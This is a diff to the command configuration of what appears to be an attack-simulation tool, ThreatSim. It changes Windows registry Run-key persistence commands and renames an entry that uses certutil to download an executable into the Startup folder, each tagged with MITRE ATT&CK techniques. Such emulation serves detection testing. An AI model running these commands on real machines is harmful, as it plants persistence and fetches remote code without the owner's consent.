@@ -49,7 +49,7 @@ commands:
    add_registry_run_2:
       remote: false
       id: add_registry_run_2
-      command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v threatsim /d "C:\temp\threatsim.exe"'
+      command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v threatsim /d "C:\threatsim\threatsim.exe"'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -59,7 +59,7 @@ commands:
    add_registry_run_3:
       remote: false
       id: add_registry_run_3
-      command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v threatsim /d "C:\temp\threatsim.exe"'
+      command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v threatsim /d "C:\threatsim\threatsim.exe"'
       stealth: low
       mitre:
          - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
@@ -86,9 +86,9 @@ commands:
          - 'Privilege Escalation;T1547.001;Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
          - 'Persistence;T1547.001;Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
       comments: 'Force a malicious shell folder to execute on startup by editing runkeys.'
-   startup_binary_1:
+   certutil_download_startup_item:
       remote: false
-      id: startup_binary_1
+      id: certutil_download_startup_item
       command: 'certutil -urlcache -f -split https://github.com/joeavanzato/ThreatSim/TODO ‘C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\threatsim.exe'
       stealth: low
       mitre:
